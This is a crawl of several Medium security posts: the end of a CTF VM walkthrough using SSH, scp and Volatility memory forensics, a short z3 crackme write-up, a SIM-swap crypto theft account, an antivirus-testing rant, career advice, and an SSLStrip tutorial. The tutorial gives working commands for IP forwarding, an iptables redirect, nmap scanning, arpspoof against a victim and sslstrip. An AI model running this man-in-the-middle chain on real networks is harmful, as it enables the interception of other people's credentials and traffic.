The actual flag clue for the 7th flag is “Frank Was Caught on Camera Cashing Checks and Yelling — I’m The Fastest Man Alive!” with nothing else to try at this stage I Googled the clue string and after removing parts of it I was left with “The fastest man alive” which came back as a possible hint, it refers to the 2nd episode of the The Flash. This is a hint I think because in the film Franks character also takes the name Barry Alan who is the alter ego of The Flash. It all seems to fit with the clue but still doesn’t lead me to the flag.
So lets use this new info and try to get somewhere. I still haven’t gotten into the SSH login yet so maybe barry is a user for that lets see.
┌─[✗]─[root@parrot]─[/home/andrew/Desktop]└──╼ #ssh 192.168.1.155 -p 22222 -l barry.alan# WARNING ############################### FBI — Authorized access only! # # Disconnect IMMEDIATELY if you are not an authorized user!!! ## All actions Will be monitored and recorded ## Flag{53c82eba31f6d416f331de9162ebe997} #######################################barry.alan@192.168.1.155’s password: Permission denied, please try again.
using the passwords from the clues gives me nothing. It’s then that I realise my mistake. I have been using the wrong spelling. In the film it’s spelt Barry Allen not Alan. So let’s pretend that didn’t happen and try to log into the SSH again this time with the correct spelling haha
DAMN IT!! Still no luck. Ok after what seemed like every combination of Barry and Allen I could possibly think of I hit gold with barryallen and the password iheartbrenda.
┌─[✗]─[root@parrot]─[/home/andrew/Desktop]└──╼ #ssh 192.168.1.155 -p 22222 -l barryallen####################################### WARNING ## FBI — Authorized access only! # # Disconnect IMMEDIATELY if you are not an authorized user!!! ## All actions Will be monitored and recorded ## Flag{53c82eba31f6d416f331de9162ebe997} #######################################barryallen@192.168.1.155’s password: Welcome to Ubuntu 16.04.1 LTS (GNU/Linux 4.4.0–38-generic x86_64)
* Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage
14 packages can be updated.7 updates are security updates.
barryallen@skydogconctf2016:~$
I’m in, lets see whats on the system
barryallen@skydogconctf2016:~$ lsflag.txt security-system.data
Theres the flag and a simple CAT command gives me
flag{bd2f6a1d5242c962a05619c56fa47ba6} which decrypts to
bd2f6a1d5242c962a05619c56fa47ba6 md5 theflash (haha I knew it was going to be that) cool, so just one flag left to get and the clue is
Flag #8 Franks Lost His Mind or Maybe it’s His Memory. He’s Locked Himself Inside the Building. Find the Code to Unlock the Door Before He Gets Himself Killed!
The other file on the system was a security-system.data file. Lets see what we can do with that.
barryallen@skydogconctf2016:~$ file security-system.data security-system.data: Zip archive data, at least v2.0 to extract
So lets unzip it and see what it contains, I couldnt unzip it all on the system so decided to copy the file back to my local VM to work on it.
I have recently been using Parrot Security OS https://www.parrotsec.org/ its an OS similar to Kali. I really like it, I cant see any benefit to using it exclusively over Kali but it’s making a nice change.
┌─[✗]─[root@parrot]─[/home/andrew/Desktop]└──╼ #scp -P 22222 barryallen@192.168.1.155:/home/barryallen/security-system.data /home/andrew/Desktop############################################## WARNING ## FBI — Authorized access only! # # Disconnect IMMEDIATELY if you are not an authorized user!!! ## All actions Will be monitored and recorded ## Flag{53c82eba31f6d416f331de9162ebe997} ##############################################barryallen@192.168.1.155’s password: security-system.data 100% 1024MB 58.5MB/s 00:17
So having saved it back to my desktop I can work on it locally now, lets see if I can unzip it. Success it unzips and appears to be a memory dump. Which actually matches up with the clue
Franks Lost His Mind or Maybe it’s His Memory. He’s Locked Himself Inside the Building. Find the Code to Unlock the Door Before He Gets Himself Killed!
So the past few weeks I’ve come to the conclusion that memory forensics is defintely one of my weak points. So I know what I have to do but have no idea how to do it. I can fix that with a bit of google fu. I think I’m going to try and use the app Volatility (I need to use it for a cyber EPQ course I am currently enrolled on, so it’ll be two birds with one stone)
I need to take a break here and grab a coffee whilst researching how to use Volatility.
So after a bit of forum trawling I came across this site http://resources.infosecinstitute.com/memory-forensics-and-analysis-using-volatility/ and for the next few steps I will be following along with the tutorial. (update, this wasn’t so helpful after the first step, for this CTF anyway)
I need to find out what OS the dump came from so that I can apply the correct profile in Volatility to be able to move forward.
┌─[✗]─[root@parrot]─[/home/andrew/Desktop]└──╼ #volatility imageinfo -f /home/andrew/Desktop/security-system.dataVolatility Foundation Volatility Framework 2.6INFO : volatility.debug : Determining profile based on KDBG search… Suggested Profile(s) : WinXPSP2x86, WinXPSP3x86 (Instantiated with WinXPSP2x86) AS Layer1 : IA32PagedMemoryPae (Kernel AS) AS Layer2 : FileAddressSpace (/home/andrew/Desktop/security-system.data) PAE type : PAE DTB : 0x33e000L KDBG : 0x80545b60L Number of Processors : 1 Image Type (Service Pack) : 3 KPCR for CPU 0 : 0xffdff000L KUSER_SHARED_DATA : 0xffdf0000L Image date and time : 2016–10–10 22:00:50 UTC+0000 Image local date and time : 2016–10–10 18:00:50 -0400
Cool, ok so it’s a memory dump from an XP machine. The next step in the tutorial is to see if there were any running services when the memory dump was captured.
┌─[root@parrot]─[/home/andrew/Desktop]└──╼ #volatility — profile=WinXPSP2x86 pslist -f security-system.data Volatility Foundation Volatility Framework 2.6Offset(V) Name PID PPID Thds Hnds Sess Wow64 Start Exit  — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 0x867c6830 System 4 0 57 171 — — — 0 0x86262900 smss.exe 332 4 3 19 — — — 0 2016–10–10 21:59:140x8623b978 csrss.exe 560 332 10 423 0 0 2016–10–10 21:59:14 0x865ed020 winlogon.exe 588 332 24 512 0 0 2016–10–10 21:59:14 0x8662d808 services.exe 664 588 15 263 0 0 2016–10–10 21:59:14 0x866a5670 lsass.exe 676 588 25 356 0 0 2016–10–10 21:59:14 0x86358a70 vmacthlp.exe 848 664 1 25 0 0 2016–10–10 21:59:14 0x86651da0 svchost.exe 860 664 21 202 0 0 2016–10–10 21:59:14 (THERE WERE ABOUT ANOTHER 30 PROCESSES THAT I’VE TRIMMED OFF HERE)
Wow ok that’s a lot of processes, looking at the rest of the tutorial I dont think it’s going to help me much with this challenge. So lets see what I can do on my own.
First lets see what plugins I have available to me
┌─[✗]─[root@parrot]─[/home/andrew/Desktop]└──╼ #volatility -hVolatility Foundation Volatility Framework 2.6Usage: Volatility — A memory forensics analysis platform.
THERE WERE ALOT OF PLUGINS BUT THIS ONE STOOD OUT AS A POSSIBLE WAY TO MOVE FORWARD.
filescan Pool scanner for file objects
┌─[root@parrot]─[/home/andrew/Desktop]└──╼ #volatility — profile=WinXPSP2x86 -f security-system.data filescanVolatility Foundation Volatility Framework 2.6Offset(P) #Ptr #Hnd Access Name — — — — — — — — — — — — — — — — — — — — 0x0000000005e52f90 1 1 RW-rw- \Device\HarddiskVolume1\WINDOWS\WindowsUpdate.log0x0000000005e531d8 1 1 R — rw- \Device\HarddiskVolume1\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.5512_x-ww_35d4ce830x0000000005e53270 1 1 R — rw- \Device\HarddiskVolume1\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.5512_x-ww_35d4ce830x0000000005e538a8 3 1 R — rwd \Device\HarddiskVolume1\Documents and Settings\test\NetHood0x0000000005e53df8 1 1 R — rw- \Device\HarddiskVolume1\WINDOWS\WinSxS\x86_Microsoft.VC90.CRT_1fc8b3b9a1e18e3b_9.0.30729.4148_x-ww_d495ac4e0x0000000005e54de8 1 1 R — rw- \Device\HarddiskVolume1\WINDOWS\WinSxS\x86_Microsoft.Windows.GdiPlus_6595b64144ccf1df_1.0.2600.5512_x-ww_dfb54e0c0x0000000005e54e80 1 1 R — rw- \Device\HarddiskVolume1\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.5512_x-ww_35d4ce830x0000000005e58300 1 0 R — rw- \Device\HarddiskVolume1\WINDOWS\system32\mydocs.dll0x0000000005e5bd18 1 1 — — — \Device\NamedPipe\Ctx_WinStation_API_service0x0000000005e5c2f0 1 0 R — r-d \Device\HarddiskVolume1\WINDOWS\system32\ipconfig.exe0x0000000005e5c5b0 1 1 RW-rw- \Device\HarddiskVolume1\WINDOWS\WindowsUpdate.log0x0000000005e5c6f8 1 1 RW-rw- \Device\HarddiskVolume1\WINDOWS\WindowsUpdate.log
This is just a quick copy and paste of the HUGE amount of files it pulled off the system. So I need to tweak the output slightly lets see if I can use GREP with Volatility.
┌─[root@parrot]─[/home/andrew/Desktop]└──╼ #volatility — profile=WinXPSP2x86 -f security-system.data filescan | grep ‘flag’Volatility Foundation Volatility Framework 2.6
searhing for the string flag didnt return anything useful. Let’s see if I can search again using jsut the file extension. Let’s try with .txt
┌─[✗]─[root@parrot]─[/home/andrew/Desktop]└──╼ #volatility — profile=WinXPSP2x86 -f security-system.data filescan | grep ‘.txt’Volatility Foundation Volatility Framework 2.60x0000000005e612f8 1 0 -W-r — \Device\HarddiskVolume1\Documents and Settings\test\Desktop\code.txt
Bingo (I think)!! Ok so how do I read the code.txt file. Let’s see if I can just run CAT against it using the file path.
Nope that didnt work, lets go back to the plugin list and see what else might be available to use.
After trying loads, I purely stumbled across the cmdscan plugin and got this returned
┌─[root@parrot]─[/home/andrew/Desktop]└──╼ #volatility — profile=WinXPSP2x86 -f security-system.data cmdscanVolatility Foundation Volatility Framework 2.6**************************************************CommandProcess: csrss.exe Pid: 560CommandHistory: 0x10186f8 Application: cmd.exe Flags: Allocated, ResetCommandCount: 2 LastAdded: 1 LastDisplayed: 1FirstCommand: 0 CommandCountMax: 50ProcessHandle: 0x2d4Cmd #0 @ 0x1024400: cd DesktopCmd #1 @ 0x4f2660: echo 66 6c 61 67 7b 38 34 31 64 64 33 64 62 32 39 62 30 66 62 62 64 38 39 63 37 62 35 62 65 37 36 38 63 64 63 38 31 7d > code.txt
Awesome, it’s returned a cmd line input from where the user echoed a hex string into the code.txt file. I still don’t know how to read the actual code.txt file using Volatility but I got lucky this time with the cmd line. (I’ve made a note to go back and do a deep dive on using Volatility)
So let’s take the hex input and convert it back to something I can read. Using asciitohex.com it decrypts as the flag :-)
flag{841dd3db29b0fbbd89c7b5be768cdc81} quick jump over to crackstation.net and it returns
841dd3db29b0fbbd89c7b5be768cdc81 MD5 : Two[space]little[space]mice
A google search to confirm my thought and Two little mice is from the film also. The quote is:
“Two little mice fell in a bucket of cream. The first mouse quickly gave up and drowned. The second mouse, wouldn’t quit. He struggled so hard that eventually he churned that cream into butter and crawled out. Gentlemen, as of this moment, I am that second mouse.”
I completely feel like that second little mouse right now, I almost gave up on that last flag when I wasn’t getting anywhere with Volatility but I’m so glad I kept on going and eventually “churned that cream into butter” haha.
SO much fun, huge thanks to James Bower for creating this VM and for Vulnhub.com for hosting it and all the other VM’s
Written by
","['Infosec', 'Cybersecurity', 'Ethical Hacking', 'Hacking', 'Ctf']"
Solving a simple crackme using Z3 - Aneesh Dogra’s Blog,https://anee.me/solving-a-simple-crackme-using-z3-68c55af7f7b1?source=tag_archive---------8-----------------------,"I participated in the recent Scripting Challenge hosted by Byld. Palash made a nice rev question, which could be solved using z3, so here it is. Let’s try opening up the binary in IDA.
The function checkUser2 is of most importance. Its used to check the username and password and depending on the result allows us to cat the flag if its a successful login. Let’s try to see what that function’s doing:
v6 is a constant array, used to do computations inside the loop. At every iteration v4 should be 0 to make it a valid username/password combo. Lets try to remove the useless casts and get a clearer version of the forloop’s body.
Let’s try to feed this into z3 and see if it can find a satisfiable input.
I and J are kk2 and e receptively. Rest of the code should be self-explanatory, and here we go:
Now lets try to feed this to our program:
There’s our flag!
Written by
","['Archive', 'Reverse Engineering', 'Pwnage', 'Symbolic Execution', 'Security Engineering', 'Misc', 'Z3', 'Computer Security', 'Reverse Engineering', 'Cybersecurity', 'Programming']"
"Someone Just Stole $9,000 of Crypto from Me… - BlockChannel - Medium",https://medium.com/blockchannel/someone-just-stole-9-000-of-crypto-from-me-dc04e89c289d?source=tag_archive---------4-----------------------,"BlockChannel wants to remind you that information security is hard, and securely storing vast amounts of digital wealth is even harder. It’s important you’re familiar with the mistakes that even other smart people can make. Audit your personal security practices, and make sure you’re protected accordingly.
Obligatory Disclaimer: To modify a quote from Tim Ferris, “I am NOT a financial advisor, and none of this advice should be taken without speaking to a qualified professional first. Also, my results [are most likely] due to pure luck and zero skill.”
I got a little buzz on my phone today from Google letting me know my Gmail password had been reset. A few minutes later a “security update” was installed on my phone, and I could no longer receive calls or texts. I was the victim of a standard SIM card hijacking.
Due to some lazy crypto security mistakes on my part, someone was able to steal $9,000 worth of various cryptocurrencies from me. I’m writing to let you know you shouldn’t make the same mistakes. Here are four steps you can take to avoid my fate:
One of the reasons the entire scenario happened in the first place was most likely because my phone number was attached to my Gmail, my Twitter, Facebook, etc. etc. etc. And why not? We all love being connected, and we all love convenience.
Unfortunately, this convenience comes at a cost — hackers can easily use your number to take control of your phone through your accounts. Even though my cell carrier account had a pin on it, they were still able to get in and port my SIM card to their own phone. This gave them access to my text messaging, which is all they needed to reset the passwords to pretty much every account I have.
The reality is that it’s impossible to perfectly secure every account you have. Your goal should be to become a more difficult target. This is where I made my worst mistake. I got lazy and kept several private keys on my Google Drive, which the hacker had immediate access to. It was a piece of cake to log into those accounts, and clean everything out.
I recommend (and am currently in the process of) moving all my new private keys into encrypted documents that are stored on encrypted removable disks. And I’m doing this on several removable disks, and I’m storing them in multiple physical locations. I’m going so far as writing down some of my passwords on a piece of paper, and storing them in a lockbox. Any sort of “cloud service” IS NOT secure. Don’t trust any of them.
I’ve been saying for years that I’m going to buy a hardware wallet. Well today, four hours after losing $9,000, I’m biting the bullet. I decided to order a Ledger Nano S, but I’ve been told TREZOR is another great option.
People may ask how much crypto you need to have before thinking about buying a hardware wallet. My answer after today? Whatever amount you’d rather not lose. For some people that may be $20. For others that may be $5,000. Either way, storing your crypto on a hardware wallet makes you a little less easier of a target. And that’s a step in the right direction.
I’ve known for quite some time that I should be more secure with my crypto. I’ve read it everywhere. I’m highly embarrassed that these mistakes cost me so much, but I hope that this situation helps you avoid the same thing.
If you’d like to read more about good crypto security practices, I’d recommend starting with Daniel Jeffries’ piece, “Eight Simple Rules for Protecting Your Cryptocurrency.” Don’t be a crypto fool like I was — listen to his advice and take steps to secure your hard earned crypto now.
If you haven’t invested in Bitcoin yet and you want to join the movement, the easiest way to begin is with Coinbase. Get $10 of free Bitcoin when you use this link — it’s my referral link — and get started now!
If you’d like to start using an exchange instead of Coinbase, Binance is a great place to start. Sign up here!
Written by
","['Ethereum', 'Handshake', 'Governance', 'Cryptoeconomics', 'BlockChannel Show', 'About Us', 'All Articles', 'Podcast', 'Bitcoin', 'Investing', 'Cryptocurrency', 'Security', 'Cybersecurity']"
Some thoughts on the CrowdStrike vs NSS Labs debacle,https://medium.com/@bontchev/some-thoughts-on-the-crowdstrike-vs-nss-labs-debacle-19bc15d01a2b?source=tag_archive---------4-----------------------,"Regarding the CrowdStrike vs NSS debacle, I’d like to share some thoughts with you on the subject of anti-virus tests.Let's start with CrowdStrike. All the “next-gen” anti-virus companies are sleazebags. They are new, they are hungry, they see the tons of money made by the “established” anti-virus industry and they are envious. They want their slice of the pie.Problem is, it is goddamn impossible for a newcomer to do really well in this field. No, it is not fair — but this is how it is. The main reason is because most users simply cannot grasp how to use any kind of anti-virus product besides a scanner.A behavior blocker?
Process X is trying to communicate over port Y.
WTF does that mean? Is it a worm trying to infect other machines? Or is a program trying to check its update server for a new version of itself?
Program FOO is modifying program BAR.
Again, WTF does that mean? Is a virus in FOO trying to infect BAR? Or is FOO part of a compiler/IDE that is trying to create the executable BAR? The average user doesn’t have a clue.An integrity checker?
File SNAFU was modified.
Well, WTF does this mean? Was it infected by a parasitic virus? Or was it modified by Windows Update?As opposed to that, a scanner is easy to understand.
File X contains malware Y.
or
File Z is clean.
Either or both of these messages could be totally wrong (the two kinds of errors are called “false positives” and “false negatives”) but they are something the user can understand.So, no matter how advanced an anti-virus product is, it must include a scanner (or something that behaves like a scanner) — or the users simply won’t use it. This, despite the fact that scanners are the weakest defense against viruses and malware in general.What do scanners do? They detect either “known bad stuff” or “stuff that contains code known to do bad things”. This worked quite well quarter of a century ago when all known malicious programs could fit on a 360Kb floppy disk but nowadays there is a humongous number of known malicious programs (anything between 10 and 200 million and anybody who claims to know their number more exactly is lying) and new ones are being created (often automatically) every goddamn day — at the rate of 1-2 million new ones every day, on average.There is absolutely no way a newcomer to the anti-virus field could produce a scanner that can detect a reasonably large amount of the known malware. (And, remember, a scanner that detects less than 90% of the known malware is considered as being mostly crap.) They would need years just to catch up with the established scanner producers (who have been at this game for quarter of a century already) — and by the time they do, the number of known malicious programs would have increased by several orders of magnitude, so they would be already obsolete anyway.So, what is a newcomer to do? Lie, cheat and muscle your way in. Claim that the established guys are “obsolete”, “legacy”, while their product uses completely new, next-generation ideas. (There is no such thing in reality, of course. Just about every single idea in this field was already invented and tried two decades ago. Heuristics, machine learning, everything. Different techniques work to a different degree and different companies put different emphasis on them. That’s it.) Don’t allow your product to be independently tested and evaluated by competent people. Use misleading advertising. Slander the established guys and the testers who show that your product sucks compared to the established ones. Sue, if you are in the USA. That sort of thing. And hope that enough users will be fooled to buy your product for you to make money.Now that I’ve dealt with the “next-gen anti-virus” guys, let me look at the other side of the coin — the anti-virus testers.Testing an anti-virus product properly is an impossibly hard job. I should know — I practically invented independent competent anti-virus testing while I was working at the Virus Test Center at the University of Hamburg in the early ’90s.To begin with, since just about every self-respecting anti-virus product contains a scanner (see above), you need a comprehensive collection of known malware. It has to contain pretty much everything known to exist, because, remember, a scanner that detects less than 90% of it is crap and you have to be able to measure this. You have to be a competent malware researcher, in order to make sure that what is in your test set is indeed malware. And if you think that you can determine that just by running a scanner on it and observing its output, you are an idiot and your place is not in the anti-virus testing business.But scanners are only one small part of the contemporary anti-virus suites. To test just them would be hugely unfair, because they have many other ways to protect the customer from a malware infection. And you have to test in realistic conditions. In real life, nobody is attacked by a multi-terabyte hard disk full of hundreds of millions of static malicious programs. In real life people are attacked by 1-3 malicious programs that they have executed on their computer.So, you have to execute the malicious program on the machine protected by the anti-virus suite you’re testing. This might sound simple, but it is not. Malware would often refuse to run (or to do anything meaningful) for the weirdest of reasons. It might detect that you’re using a virtual machine. It might not like your machine’s IP address. It might require weird command-line arguments (that are normally provided by another piece of malware). Or it might just do its thing only on Friday the 13th, or only if the current year is earlier than 2009. Or maybe it is simply a corrupted sample that doesn’t work at all. And if it “doesn’t do its thing” on your machine, the anti-virus you’re testing might not stop it (I am assuming here that the on-access scanner missed it and let it run in the first place). But it might stop it on a real user’s machine, if the malware decides to try to “do its thing” there. And you have to catch that. So, you have to reverse-engineer the malware and figure out why it isn’t working.And then you have to wipe the machine and repeat the exercise with another anti-virus, for each of the anti-virus products you are testing.And once you’re done, you realize that you have just tested how these products protect from one particular malware. Now repeat the above procedure 200 million times for all the known malicious programs in your (supposedly good) malware collection.And once you’re done (good luck with that), you must also test all the products for false positives! Remember, the user is unable to tell whether a report from an anti-virus product is correct or not, so a wrong “this is malware” report can cause nearly as much damage as missing real malware (e.g., resulting in the anti-virus product deleting a program Windows needs to work and disabling your whole corporate network), so a good test needs to test for such things, too.It’s an impossible task!So, all anti-virus testing outfits generally fall into two categories — incompetent and incomplete. (Of course, some are both.) The incompetent ones often publish in popular computer magazines. They “test” irrelevant things like the user interface or whether the documentation is easy to understand. They use “malware” which somebody or something (usually — a scanner) told them is malware. They are idiots.The incomplete ones are the ones you usually see as professional independent anti-virus testing outfits — like AV Comparatives, Virus Bulletin, and so on. They have a generally sound testing methodology, but it is necessarily very limited — because, as we saw above, proper and complete anti-virus testing is simply not humanly possible. So, they use a small (and often obsolete) test set like a few hundred malicious programs, or only test one particular aspect of the anti-virus product (e.g., the scanner) and so on.A favorite pet peeve of mine was tests using the so-called WildList — a (very short) list of (mostly) viruses that were supposed to be “in-the-wild” — i.e., what was actually attacking users currently. Except that it was no such thing, it was full of crap, it wasn’t current, it was too short and so on and so on. So, anyone testing only with it was an idiot. (Yet many anti-virus products regularly failed even such tests.)In addition to these two categories, some anti-virus testing outfits are both incompetent and greedy. They charge outrageous amounts of money for their tests. This is not entirely unreasonable, given how hard and time-consuming it is to get a good anti-virus test done right — but it gives the tested companies the impression that they are “buying” (paying for) tests, so it naturally annoys them when the results are not to their liking. Sometimes the situation is so bad that I’ve had one anti-virus producer tell me “we’re paying thousands for this shit, and then I have to spend days doing the tester’s job for them and explain them why some malware samples are corrupted and non-working and shouldn’t be in the test set, why some program labeled as a false positive isn’t a false positive because it does questionable stuff just as our product reports, and why they haven’t understood (or even read) the documentation”.So, there’s that. Whenever there is a major conflict, like this CrowdStrike vs NSS Labs story, you can usually bet that both sides are in the wrong. CrowdStrike probably have a crappy product they want to sell and didn’t like the test results, while NSS Labs probably has a crappy and/or incomplete testing methodology and CrowdStrike found some legitimate flaws in it.My personal opinion is that the companies whose products are being tested shouldn’t pay for the tests — the users of the tests should pay for the results. Also, if a company does not want its product tested by a particular testing outfit, that outfit shouldn’t test it (instead of jumping through hoops to obtain secretly a copy of the product and test it). Let the competitors use this for their advantage (“Ha-ha, company X is afraid to have their product tested independently — what are they hiding?”).But, all in all, anti-virus testing is a thankless job, impossible to do right, and the anti-virus industry is full of snake oil peddlers.End of rant.
Written by
","['Security', 'Cybersecurity', 'Antivirus', 'Testing']"
"So, you want to work in security? - freeCodeCamp.org - Medium",https://medium.com/free-code-camp/so-you-want-to-work-in-security-bc6c10157d23?source=tag_archive---------0-----------------------,"Every once in a while, I’ll get an email from an eager stranger asking for advice on how to have a career in security (computer, information, cyber… whatever). This is great! We need more passionate, creative, hard-working people that want to work on making technology safer to use. It also turns out to be a pretty financially stable way to make a living.
There are plenty of other posts on this exact topic ¹, but I’ll offer some high-level thoughts pulled from my own experience.
Working in security isn’t like it’s depicted in Hollywood. I LOVE watching hacker-inspired movies and shows for the fantasy and escape, but day-to-day work isn’t (in my experience) as fast-paced and sexy as it looks on screen.
Now, that’s true for most professions, and even if I’ve never spent a day deciphering streaming code in an underground lair, I still think it’s an exciting, important, challenging, and rewarding field to work in.
Security is a broad, interdisciplinary, applied field. There are needs for people that design and build secure systems, people that try to break systems, people that try to detect intrusions, and lots of things in between. If I’ve learned anything, I’ve learned that there is no single, standard, or best preparatory path. Maybe this will change as the field matures, but I doubt it. It’s also not like other professional fields that require accreditation (e.g. medicine, law), which can be both liberating and intimidating.
Independent of how you acquire it, you’ll benefit from having a strong understanding of applied computer science, or how computers and software work. Much of applied computer science is about solving problems with layers of abstraction, and security is often about finding the flawed assumptions in those abstractions… and then figuring out how to best fix (or exploit) them.
I did this by earning an engineering degree in Computer Science from a public university. Some of the more useful topics to me were operating systems, networking, computer architecture, and compilers. Beyond that, I just took technical courses I found interesting (e.g. digital signal processing, biomedical engineering, artificial intelligence) and explored security topics in networking, privacy enhancing technologies, and (web, client) application security via project work in student clubs and internships.
You’ll also benefit from understanding how people (users, customers, whatever) that use technology work. If I could go back in time to my more {care, obligation}-free university days, I’d take some classes in psychology, sociology, and human factors.
I work with experts that have similarly traditional academic backgrounds (e.g. degrees in computer engineering, computer science, mathematics, etc.). I also know plenty of people that have less typical backgrounds (e.g. chemistry, film studies, psychology, graphic design) and some folks that dropped out of school before finishing a degree.
On the topic of security certifications, I don’t have any, and I don’t think I’ve been held back because of it. It’s possible that some industries or countries require them for infosec professionals, and they’re certainly a thing that some reasonable people have pursued — caveat emptor!
Culturally, I’d recommend reading the Hacker Manifesto or How to Become a Hacker, which serves as both inspiration and moral compass for many security experts. Even if you don’t liken yourself to a hacker, it’s helpful to understand the mindset of some of the people you’re working alongside.
Beyond that, most of what I know I’ve learned over time, in anecdotes and nuggets from friends and co-workers, security blogs, conference papers and presentations, mailing lists, local security groups, and other online resources. A lot of the things I hear about or ingest today come from folks on my Twitter security list.
This applies to any career pursuit, but get some real life work experience as fast as you can. That’s the best way to narrow down your interests, strengths, and areas of future development. You’ll also better understand what a normal work day and environment consist of, including what you like and don’t like. One of the most valuable career-related experiences of my life was doing an internship I hated since it veered me strongly into another direction :)
In terms of how to start getting experience, I don’t have a simple answer. Check out career fairs and conferences, get involved in clubs or other organizations, apply for internships and part-time jobs with bold enthusiasm. Way before coming to Google, I cleaned up dried nacho cheese at a concession stand as part of my regular shift as a community pool lifeguard. That little bit of job experience helped me get a college dorm SysAdmin job, which no doubt was relevant when interviewing for an IT internship at a large Pharmaceutical company. I got some “real” (i.e. non-coursework) software experience with clubs at University, and I found a cybersecurity internship posting on a school newsgroup, which probably gave me just enough relevant job experience for someone at Google to consider me for an interview.
The best security engineers I know are also actively writing code. This gives them firsthand experience with writing software, including unintentionally-yet-inevitably introducing security bugs. The latter forces a real empathy for all developers. After all, it’s often harder to consistently write secure code than it is to point out insecure code.
If you’re stuck on where to start in a project of significant size, try fixing bugs in an open source project. Everyone loves people that fix bugs! The project will thank you, and it’s typically a good way to get real-world experience and your foot in the door for future work.
Spend time finding software bugs. Learn how to use a debugger, network scanner, web debugging proxy, and software fuzzer. Spend time in hacker playgrounds, which are available for all skill levels. I first used https://www.hackthissite.org when I was in college, and listed out a couple other self-guided hacker training sites at https://infosec.rocks. There’s also a good list of hacking challenges, competitions (e.g. CTFs), and time wasters here. Or find and report bugs in actual software you use. There are plenty of software vendors that offer financial rewards for security bugs, including Chrome and Google, as well as some core open source projects covered by the Internet Bug Bounty program.
Beyond finding bugs yourself, I’d recommend following along and learning from what others are finding (bugtraq, fulldisclosure, oss-sec).
I started learning about security back in college from peers in an ACM special interesting group called SigMil, where members would give unpolished presentations about security topics they were interested in. We also took an annual pilgrimage to DEFCON to attend talks (which was a lot easier to do a decade ago), buy security books or magazines, or just chat with likeminded folks from other parts of the world about what they were working on. At Google, I’ve learned SO MUCH directly from my peers sharing their expertise, struggles, and half-baked ideas.
Sharing knowledge is important for a few reasons:
Working in security means you’ll need to regularly explain complex, technical problems to different audiences, each with different vocabularies, expertise, and incentives. You’ll rarely have universal metrics to lean on when describing the severity of a vulnerability, nor will you have anything shiny to show off when promoting best security practices. You’ll have to keep people unflustered in the face of FUD, yet focused on action outside of crisis.
All of this takes skills in the art of communication, and in particular, explanation and negotiation. You’re unlikely to master this art from purely technical resources, so practice, publish, and forever aim to improve.
Perhaps this is obvious, but it’s worth explicitly being called out.
Security is challenging work. You’ll need to constantly learn new things because the technical landscape you’ll need to secure is rapidly evolving much faster than our ability to deprecate the old, yet-to-be-entirely-secured stuff. The threat actors, who often have time and resources on their side, are also quick to adapt to existing defenses.
Security can be stressful. You’re dealing with ambiguous problems, imperfect solutions, limited data, and real threats to human safety.
It’s hard to measure success with security, and in my experience, people are more likely to notice failure. When securing real world technology, we’re ultimately in the business of risk mitigation, and no matter what someone on an RSA vendor floor tells you, there are no silver bullets.
This field can be depressing for some of the reasons I just outlined. It can seem impossible to keep pace with the speed of innovation in technology and exploitation. I mean, buffer overflow vulnerabilities have been around for decades, yet we still regularly see high-impact exploits leveraging them today (2016). You’ll regularly hear people scream security is impossible, and it’s getting worse, or make entirely eloquent points about why we’re all failing.
Reality can be harsh, but if we focus on the positive and think of all the things technology has afforded, it’s pretty dang impressive! It’s not perfect. It will never be perfect. But I think the cutting edge of security is a lot better than it was 10 years ago, we can do some pretty impressive stuff with some level of reasonable assurance, and that’s something that keeps me optimistic.
Don’t get discouraged if you run into jerks. I’ve seen plenty of chauvinism and ego in the infosec industry over the years. It’s not uncommon for a conversation (online, at a conference, wherever) to quickly turn into who is the most elite.
Perhaps this isn’t the experience for everyone, but I’ve been successful in large part due to the support, advice, mentorship, and help from lots of great security people whom I now consider friends. Just because you have to ask for help does NOT mean you aren’t cut out for this work.
If you need help, ask for it. Just make sure you do your due diligence and make it as easy as possible for people to help you. Most experts are pretty busy, so you’re much more likely to get a useful response if you ask a well-scoped question with sufficient context and no typos.
[1] Some other security career advice thoughts I’ve stumbled upon:
Written by
","['Archive', 'Infosec', 'Security', 'Career Advice', 'Cybersecurity', 'Hacking']"
SSL Strip & How awesome it is! - InfoSec Write-ups - Medium,https://medium.com/bugbountywriteup/ssl-strip-how-awesome-it-is-a0eb79e28bcc?source=tag_archive---------6-----------------------,"This article isn’t like my previous articles where I demonstrate a hack that I have carried out but its more of a tutorial. I haven’t been writing much these days as I am focusing on developing my skills. I wanted to write about this hack in particular as it is one of those topics about which most of us know the theory but never really understand as to how should we put it in practise.
I know most of you reading this article must have heard about SSL Striping, this is actually a man in the middle attack where you become a proxy between the victim and the webpage they are visiting. This is not even the main part, the actual trick is to strip off the SSL configuration present on the website and make a https website into a http website, making all the traffic communication in plain text.
So, to begin with the attack let me give you an idea of the things required to carry this out
First of all we need to figure out the interface we are using to connect to the network, to do so we can use the “ ifconfig ” command on our Kali Machine
Now once we figure out the interface we are using then we need to carry out the IP forwarding process for which we type in the given command.
echo 1 > /proc/sys/net/ipv4/ip_forward
Now, we configure our IP tables which will re-route the traffic from one part to the another, which is what our SSL Strip will be listening to
iptables -t nat -A PREROUTING -p TCP - -destination-port 80 -j REDIRECT --to-port 8080
As we have configured the traffic to be routed through our machine now we have to find the gateway router’s IP address, the command is
route -n
Once we figure out that then we need to scan all the machines that are on our network, for this purpose we can use nmap
nmap -sS -O 192.168.32.2/24
This is to figure out the IP address of the victim, the one we are going to attack. Once we figure out the IP address of the machine we can carry out the process of arp spoofing where the traffic from server meant for the victim’s system will be redirected to us and we will in turn forward that to the victim’s system
arpspoof -i eth0 -t 192.168.32.149 192.168.32.2
192.168.32.149 ( IP address of the victim )
192.168.32.2 ( IP address of the gateway router )
As soon as we carry out this command, then it is going to redirect the traffic to us. Simultaneously we need to open a new terminal, where we need to type out the following commands
sslstrip -l 8080
This converts the https websites into http, and we initiate a listener on the port 8080.
We are ready to go, whenever the victims opens their browser (Internet Explorer) and browse the internet the traffic will be redirected to us.
It is now that he trick begins, as soon as the victim visits an https website the website automatically converts into a http website.
